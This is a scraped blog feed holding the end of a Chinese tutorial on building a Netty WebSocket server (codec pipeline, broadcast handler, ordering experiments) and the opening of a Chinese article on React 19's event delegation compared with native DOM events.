<h3 data-id="heading-3">2.2 编解码器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ChannelPipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> socketChannel.pipeline();
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerCodec</span>());
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpObjectAggregator</span>(<span class="hljs-number">65535</span>));
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServerProtocolHandler</span>(<span class="hljs-string">"/testWs"</span>));
<span class="hljs-comment">// 自定义的handler，处理业务逻辑</span>
pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebBusinessHandler</span>(channelGroup));
</code></pre>
<p>编解码同样是WebSocket中的重要配置类。<code>WebSocket</code>握手阶段需要遵守<code>HTTP</code>协议，自然少不了请求请求的解码以及响应的解码。Netty框架本身就提供了这样的编解码器：</p>
<ul>
<li><code>io.netty.handler.codec.http.HttpRequestDecoder</code>：请求解码器</li>
<li><code>io.netty.handler.codec.http.HttpResponseEncoder</code>：响应编码器</li>
</ul>
<p>配置这样的编解码器自然没有问题。然而Netty框架还提供了更加简便的二合一编解码器：</p>
<ul>
<li><code>io.netty.handler.codec.http.HttpServerCodec</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecc185516cbc4f71855fef71a27fc8a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=n3YSCX%2FWKLenhaIGA5XyKAeSf8s%3D" alt="" loading="lazy"/></p>
<p>注释中已经说明<code>HttpServerCodec</code>是<code>HttpRequestDecoder</code>和<code>HttpResponseEncoder</code>的结合。所以我们直接用它即可。</p>
<p>解码之后的数据分成两部分：</p>
<ul>
<li><code>HttpMessage</code>：包含HTTP请求的通用信息</li>
<li><code>LastHttpContent</code>：最新具有标记的<code>HttpContent</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d7dd2afa2c44f60ad7255e748148164~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=meGf02r4cwC6tsQSSmC63YgqkNY%3D" alt="" loading="lazy"/></p>
<p><code>io.netty.handler.codec.http.HttpObjectAggregator</code>是一个HTTP聚合器，可以将<code>HttpMessage</code>和<code>HttpContent</code>聚合成<code>FullHttpRequest</code>或<code>FullHttpResponse</code>。</p>
<p>案例也给除了用在<code>HttpServerCodec</code>之后。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f3de8b6ed8141f9be0f55fcc4d7b7b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=t%2F0h6KEmcob3y5ap9BF8EoBz4ec%3D" alt="" loading="lazy"/></p>
<p><code>io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler</code>专门处理WebSocket握手和帧，参数表示WebSocket路径。</p>
<p>这里所说的帧就是<code>WebSocketFrame</code>，主要常用的帧：</p>
<ul>
<li><code>TextWebSocketFrame</code>：处理文本</li>
<li><code>PingWebSocketFrame</code>：握手请求</li>
<li><code>PongWebSocketFrame</code>：握手响应</li>
<li><code>BinaryWebSocketFrame</code>：处理二进制</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0902fa4bd74c4d6b9aa65ff8f1737cdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=cmg4nuwOWiGk3HXfTQl0yAMzRt8%3D" alt="" loading="lazy"/></p>
<p>我们常用的是<code>TextWebSocketFrame</code>文本帧。</p>
<h3 data-id="heading-4">2.3 自定义处理器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebBusinessHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleChannelInboundHandler</span>&lt;TextWebSocketFrame&gt; {

    <span class="hljs-keyword">private</span> ChannelGroup channelGroup;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WebBusinessHandler</span><span class="hljs-params">(ChannelGroup channelGroup)</span> {
        <span class="hljs-built_in">this</span>.channelGroup = channelGroup;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlerAdded</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 建立客户端</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
        log.info(<span class="hljs-string">"客户端建立连接：channelId={}"</span>, channel.id());
        channelGroup.add(channel);

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handlerRemoved</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 断开链接</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
        log.info(<span class="hljs-string">"客户端断开连接：channelId={}"</span>, channel.id());
        channelGroup.remove(channel);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, TextWebSocketFrame msg)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 接受消息</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
        log.info(<span class="hljs-string">"收到来自通道channelId[{}]发送的消息：{}"</span>, channel.id(), msg.text());

        <span class="hljs-comment">// 广播通知所有的客户端</span>
        channelGroup.writeAndFlush(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TextWebSocketFrame</span>(<span class="hljs-string">"收到来自channelId["</span> + channel.id() + <span class="hljs-string">"]发送的消息："</span> + msg.text() + <span class="hljs-string">"123_"</span>));
    }
}
</code></pre>
<p>里面的方法和TCP协议的一致。但是要说明的就是里面的参数</p>
<p><code>io.netty.channel.group.ChannelGroup</code></p>
<p>这是一个Channel的通道组，用来管理所有的通道，包括通道的新增、剔除以及消息的发送。</p>
<p><code>SimpleChannelInboundHandler</code>的泛型我们限制为<code>TextWebSocketFrame</code>，否则获取到的消息就是<code>FullHttpRequest</code>类型。</p>
<p>消息发送时，同样使用的<code>TextWebSocketFrame</code>文本帧。</p>
<h3 data-id="heading-5">2.4 其他编解码</h3>
<p>在<code>HttpServerCodec</code>和<code>HttpObjectAggregator</code>之间还可以加入两个处理器：</p>
<ul>
<li><code>ObjectEncoder</code></li>
<li><code>ChunkedWriteHandler</code></li>
</ul>
<p><code>ObjectEncoder</code>是为了将<code>Java</code>对象序列化成<code>ByteBuf</code>。</p>
<p><code>ChunkedWriteHandler</code>增加了对异步写入大型数据流的支持，既不会花费大量内存，也不会获得<code>OutOfMemoryError</code>。</p>
<h3 data-id="heading-6">2.5 绑定端口</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 配置完成，开始绑定server，通过调用sync同步方法阻塞直到绑定成功</span>
<span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> serverBootstrap.bind(<span class="hljs-number">9090</span>).sync();
log.info(<span class="hljs-string">"Server started and listen on:{}"</span>,channelFuture.channel().localAddress());
<span class="hljs-comment">// 对关闭通道进行监听</span>
channelFuture.channel().closeFuture().sync();
</code></pre>
<p>这个之前已经讲过，这里不在赘述。</p>
<h2 data-id="heading-7">03 测试</h2>
<p>测试的之后，我们采用在线WebSocketk客户端：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebfem.com%2Ftools%2Fws%2Findex.html" target="_blank" title="https://webfem.com/tools/ws/index.html" ref="nofollow noopener noreferrer">webfem.com/tools/ws/in…</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/361ffaa92f874102b4166bd97fff30b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=W6yB0R7fBkJ%2Bfu4igCm6ra3pPfM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">3.1 试错01</h3>
<p>因为我们之前在自定义处理器的泛型是<code>TextWebSocketFrame</code>，我们改成<code>Object</code>，看看默认的类型到底是什么？发送数据我们也采用直接发送的形式，看看能否成功？</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, Object msg)</span> <span class="hljs-keyword">throws</span> Exception {
    log.info(<span class="hljs-string">"msg类型:{}"</span>, msg.getClass());
    <span class="hljs-comment">// 接受消息</span>
    <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> ctx.channel();
    log.info(<span class="hljs-string">"收到来自通道channelId[{}]发送的消息：{}"</span>, channel.id(), msg);

    <span class="hljs-comment">// 广播通知所有的客户端</span>
    channelGroup.writeAndFlush(<span class="hljs-string">"收到来自channelId["</span> + channel.id() + <span class="hljs-string">"]发送的消息："</span> + msg + <span class="hljs-string">"123_"</span>);
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c11b5eaac2ea42c6912b94603ae569dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=zzKMPnK63HCTDTsjZCaKnntLFZg%3D" alt="" loading="lazy"/></p>
<p>我们可以看到，发出去的消息没有响应。打印<code>Msg</code>类型确实是<code>io.netty.handler.codec.http.websocketx.TextWebSocketFrame</code>。服务端像客户端发送的消息客户端也没有收到。</p>
<h3 data-id="heading-9">3.2 试错02</h3>
<p>我们知道编解码是顺序执行的。有没有和我一样，有这样的疑问:</p>
<p><code>WebSocketServerProtocolHandler</code>有没有可能不受顺序的影响，因为它是一个路径，我们改变一下试试。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65c045c5f4b5431999cf8965862d33f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=kFUxEySdsXQkVkps%2Fc36b4SCYew%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43c0de8d42a94bd0948c0956f1fb73c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=HsFKnjf5T6T4wESN6WKCQodMT8A%3D" alt="" loading="lazy"/></p>
<p><strong>效果：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fed0571328be42aba536d373a852f67d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=ZBIjKIeySPxF8qi0AwcqMLd8U4o%3D" alt="" loading="lazy"/></p>
<p>结果肯定是不行的，从报错信息来看，<code>WebSocketServerProtocolHandler</code>不仅提供了连接的路径，还对<code>ByteBuf</code>做了一定的转化。顺序不可妄动。</p>
<h2 data-id="heading-10">04 小结</h2>
<p>到这里WebSocket的服务端的内容就差不多了，本节的客户端采用了网上在线工具。下一节我们将通过两种方式手搓客户端连接我们的<code>WebSocket</code>服务。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React从入门到出门第六章 事件代理机制与原生事件协同]]></title>    <link>https://juejin.cn/post/7594322573452984363</link>    <guid>https://juejin.cn/post/7594322573452984363</guid>    <pubDate>2026-01-13T01:14:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573452984363" data-draft-id="7589940210832261163" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React从入门到出门第六章  事件代理机制与原生事件协同"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-13T01:14:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怕浪猫"/> <meta itemprop="url" content="https://juejin.cn/user/2832784963939438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React从入门到出门第六章  事件代理机制与原生事件协同
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2832784963939438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怕浪猫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:14:15.000Z" title="Tue Jan 13 2026 01:14:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a37377a1b1654b5fb359bed851213933~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871655&amp;x-signature=B10uyEKh1Z2yZq%2Bx8zDLuPaGOuk%3D" alt="G9oIeDzXQAIwgJc.jpeg" loading="lazy"/>
大家好～ 前面我们陆续掌握了 React 19 的组件、路由、状态管理等核心知识点，今天咱们聚焦一个容易被忽略但至关重要的底层模块——<strong>事件系统</strong>。</p>
<p>用过 React 的同学都知道，我们在组件中写的事件（如 onClick、onChange）和原生 DOM 事件看似相似，却又存在差异：比如 React 事件的 this 指向默认绑定组件实例、事件对象是合成事件（SyntheticEvent）、事件处理函数默认不会冒泡到原生 DOM 层面。这些差异的背后，都源于 React 对原生事件的封装与优化——核心就是<strong>事件代理机制</strong>。</p>
<p>很多开发者在实际开发中会遇到“React 事件与原生事件冲突”“事件冒泡不符合预期”等问题，本质上是没理清 React 事件系统与原生事件的关系。今天这篇文章，我们就从“是什么-为什么-怎么做”三个层面，拆解 React 19 事件系统的核心原理，重点说清 React UI 事件与原生 window 事件的关联，结合代码示例和流程图，让你既能理解底层逻辑，也能解决实际开发中的问题～</p>
<h2 data-id="heading-0">一、先抛问题：React 事件和原生事件有啥不一样？</h2>
<p>在拆解原理前，我们先通过一个简单案例，直观感受 React 事件与原生事件的差异。先看代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">EventDemo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> btnRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// React 事件：onClick</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 原生事件：addEventListener</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNativeClick</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'原生事件：addEventListener 触发'</span>);
    };
    btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    };
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{btnRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleReactClick}</span>&gt;</span>
      点击测试
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p>点击按钮后，控制台输出顺序是：<code>原生事件：addEventListener 触发</code> → <code>React 事件：onClick 触发</code>。这个顺序是不是和你预期的不一样？</p>
<p>再把案例改一下，给按钮的父元素也添加事件：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">EventDemo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> btnRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> parentRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// 父元素 React 事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleParentReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素 React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 子元素 React 事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素 React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 父元素原生事件</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> parent = parentRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleParentNativeClick</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'父元素原生事件：addEventListener 触发'</span>);
    };
    parent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleParentNativeClick);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      parent.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleParentNativeClick);
    };
  }, []);

  <span class="hljs-comment">// 子元素原生事件</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNativeClick</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素原生事件：addEventListener 触发'</span>);
    };
    btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
    };
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{parentRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleParentReactClick}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">padding:</span> '<span class="hljs-attr">20px</span>', <span class="hljs-attr">border:</span> '<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ccc</span>' }}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{btnRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleReactClick}</span>&gt;</span>
        点击测试
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>点击按钮后，控制台输出顺序是：</p>
<ol>
<li>子元素原生事件：addEventListener 触发（原生冒泡阶段先触发子元素）</li>
<li>父元素原生事件：addEventListener 触发（原生冒泡阶段向上传播）</li>
<li>子元素 React 事件：onClick 触发</li>
<li>父元素 React 事件：onClick 触发</li>
</ol>
<p>这个结果更让人困惑了：为什么原生事件的冒泡顺序和 React 事件的冒泡顺序完全相反？为什么 React 事件总是在原生事件之后触发？要解答这些问题，我们必须先搞懂 React 事件系统的核心——<strong>事件代理机制</strong>。</p>
<h2 data-id="heading-1">二、核心原理 1：React 事件代理机制（事件委托）</h2>
<p>React 事件系统的核心优化点就是“事件代理”（也叫事件委托）。在原生 DOM 中，我们通常会给每个元素单独绑定事件；而 React 则是将<strong>所有 UI 事件（如 onClick、onChange、onMouseMove 等）都委托给了最顶层的 document 节点</strong>（React 17 及之后版本改为委托给 root 节点，即 React 挂载的根容器，如 #root，React 19 延续这一设计）。</p>
<h3 data-id="heading-2">1. 事件代理的核心逻辑</h3>
<p>简单来说，React 事件代理的流程是：</p>
<ol>
<li>React 组件渲染时，并不会给对应的 DOM 元素直接绑定事件处理函数，而是将事件类型（如 click）、事件处理函数、组件信息等存入一个“事件注册表”；</li>
<li>在 React 挂载的根容器（如 #root）上，统一绑定原生事件（如 addEventListener('click', 统一处理函数)）；</li>
<li>当用户点击元素时，事件会从目标元素原生冒泡到根容器；</li>
<li>根容器的统一处理函数捕获到事件后，会根据事件目标（target）从“事件注册表”中找到对应的 React 事件处理函数，然后执行。</li>
</ol>
<h3 data-id="heading-3">2. 用图例梳理事件代理流程</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/885c87f09c314b15b3168b4929375f50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871655&amp;x-signature=cvzACer1lZ6fESPPLfNlr%2B2OMqA%3D" alt="dispatch-event.46e8e5ef.png" loading="lazy"/></p>
<h3 data-id="heading-4">3. 简化代码模拟 React 事件代理</h3>
<p>为了让大家更直观理解，我们用原生 JS 模拟 React 事件代理的核心逻辑：</p>
